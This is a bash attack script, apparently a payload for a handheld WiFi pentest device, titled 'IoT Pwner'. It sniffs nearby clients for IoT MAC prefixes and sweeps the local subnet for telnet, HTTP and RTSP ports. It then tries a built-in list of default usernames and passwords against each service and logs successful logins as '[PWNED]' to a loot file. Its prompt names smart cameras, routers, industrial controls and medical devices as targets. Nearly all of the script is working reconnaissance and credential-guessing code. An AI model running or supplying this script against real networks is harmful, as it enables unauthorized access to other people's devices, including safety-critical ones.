#!/bin/bash
# Title: IoT Pwner
# Author: bad-antics
# Description: Discover and exploit IoT devices on WiFi networks
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/iot_pwn"
mkdir -p "$LOOT_DIR"

PROMPT "IOT DEVICE PWNER

Scan for and exploit
vulnerable IoT devices:

• Smart cameras
• Routers/APs  
• Smart home hubs
• Industrial controls
• Medical devices

Press OK to start."

# Common IoT ports
IOT_PORTS="23,80,81,443,554,8080,8443,8081,8888,9000,37777,34567"

# IoT device signatures (MAC prefixes)
IOT_MACS="00:17:88|00:1A:22|18:B4:30|24:A0:74|2C:AA:8E|44:65:0D|50:C7:BF|60:01:94|68:C6:3A|70:EE:50|74:DA:38|78:11:DC|7C:49:EB|84:D4:7E|8C:DE:52|94:10:3E|A4:DA:32|AC:CF:85|B0:4E:26|B4:75:0E|C4:12:F5|CC:50:E3|D4:CF:F9|DC:4F:22|E0:76:D0|EC:FA:BC"

SPINNER_START "Scanning for IoT devices..."

# Get connected clients
timeout 30 airodump-ng wlan0 --write-interval 1 -w /tmp/iot_scan --output-format csv 2>/dev/null

# Parse for IoT MACs
IOT_FOUND=$(grep -iE "$IOT_MACS" /tmp/iot_scan*.csv 2>/dev/null)
IOT_COUNT=$(echo "$IOT_FOUND" | grep -c ":" 2>/dev/null || echo 0)

SPINNER_STOP

PROMPT "Found $IOT_COUNT potential
IoT devices.

Will scan for:
• Default credentials
• Known vulnerabilities
• Open services"

# Also scan local network if connected
if ip route | grep -q default; then
    GATEWAY=$(ip route | grep default | awk '{print $3}')
    SUBNET=$(echo $GATEWAY | cut -d. -f1-3)
    
    SPINNER_START "Scanning network..."
    
    # Quick network scan
    for port in 80 443 23 8080; do
        timeout 1 nc -zv "$SUBNET.1" $port 2>/dev/null && echo "$SUBNET.1:$port" >> /tmp/iot_services.txt
    done
    
    # Scan common IP ranges for IoT
    for i in $(seq 1 254); do
        (
            IP="$SUBNET.$i"
            if ping -c1 -W1 $IP &>/dev/null; then
                echo "$IP" >> /tmp/iot_alive.txt
                for port in 80 23 8080 554; do
                    timeout 1 nc -z $IP $port 2>/dev/null && echo "$IP:$port" >> /tmp/iot_services.txt
                done
            fi
        ) &
    done
    wait
    
    SPINNER_STOP
fi

# Default credential list for IoT
cat > /tmp/iot_creds.txt << 'CREDS'
admin:admin
admin:password
admin:1234
admin:12345
admin:123456
root:root
root:admin
root:password
root:
user:user
guest:guest
support:support
service:service
supervisor:supervisor
ubnt:ubnt
pi:raspberry
default:default
admin:
CREDS

PROMPT "Starting credential 
testing on discovered
devices...

This may take a while."

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULT_FILE="$LOOT_DIR/iot_results_$TIMESTAMP.txt"

echo "=== IoT Pwner Results ===" > "$RESULT_FILE"
echo "Scan Time: $(date)" >> "$RESULT_FILE"
echo "" >> "$RESULT_FILE"

PWNED=0

# Test each discovered service
if [ -f /tmp/iot_services.txt ]; then
    while read service; do
        IP=$(echo $service | cut -d: -f1)
        PORT=$(echo $service | cut -d: -f2)
        
        echo "Testing: $service" >> "$RESULT_FILE"
        
        # Test default creds
        while read cred; do
            USER=$(echo $cred | cut -d: -f1)
            PASS=$(echo $cred | cut -d: -f2)
            
            case $PORT in
                23)
                    # Telnet test
                    (echo "$USER"; sleep 1; echo "$PASS"; sleep 1; echo "exit") | timeout 5 telnet $IP 2>/dev/null | grep -qi "login\|#\|>" && {
                        echo "[PWNED] Telnet $IP - $USER:$PASS" >> "$RESULT_FILE"
                        ((PWNED++))
                        break
                    }
                    ;;
                80|8080|443|8443)
                    # HTTP Basic Auth test
                    RESP=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 -u "$USER:$PASS" "http://$IP:$PORT/" 2>/dev/null)
                    if [ "$RESP" = "200" ]; then
                        echo "[PWNED] HTTP $IP:$PORT - $USER:$PASS" >> "$RESULT_FILE"
                        ((PWNED++))
                        break
                    fi
                    ;;
                554)
                    # RTSP test
                    RESP=$(curl -s --connect-timeout 3 "rtsp://$USER:$PASS@$IP:554/" 2>/dev/null)
                    if echo "$RESP" | grep -qi "200 OK\|RTSP"; then
                        echo "[PWNED] RTSP $IP - $USER:$PASS" >> "$RESULT_FILE"
                        ((PWNED++))
                        break
                    fi
                    ;;
            esac
        done < /tmp/iot_creds.txt
        
    done < /tmp/iot_services.txt
fi

# Identify device types
echo "" >> "$RESULT_FILE"
echo "=== Device Fingerprints ===" >> "$RESULT_FILE"

if [ -f /tmp/iot_services.txt ]; then
    while read service; do
        IP=$(echo $service | cut -d: -f1)
        PORT=$(echo $service | cut -d: -f2)
        
        if [ "$PORT" = "80" ] || [ "$PORT" = "8080" ]; then
            BANNER=$(curl -s --connect-timeout 3 -I "http://$IP:$PORT/" 2>/dev/null | head -5)
            echo "$IP:$PORT" >> "$RESULT_FILE"
            echo "$BANNER" >> "$RESULT_FILE"
            echo "" >> "$RESULT_FILE"
        fi
    done < /tmp/iot_services.txt
fi

echo "" >> "$RESULT_FILE"
echo "=== Summary ===" >> "$RESULT_FILE"
echo "Devices Scanned: $(wc -l < /tmp/iot_services.txt 2>/dev/null || echo 0)" >> "$RESULT_FILE"
echo "Credentials Found: $PWNED" >> "$RESULT_FILE"

PROMPT "IOT PWNER COMPLETE!

Devices pwned: $PWNED

Results saved to:
$RESULT_FILE

Review for:
• Default creds
• Open services
• Device info"

# Cleanup
rm -f /tmp/iot_*.txt /tmp/iot_creds.txt
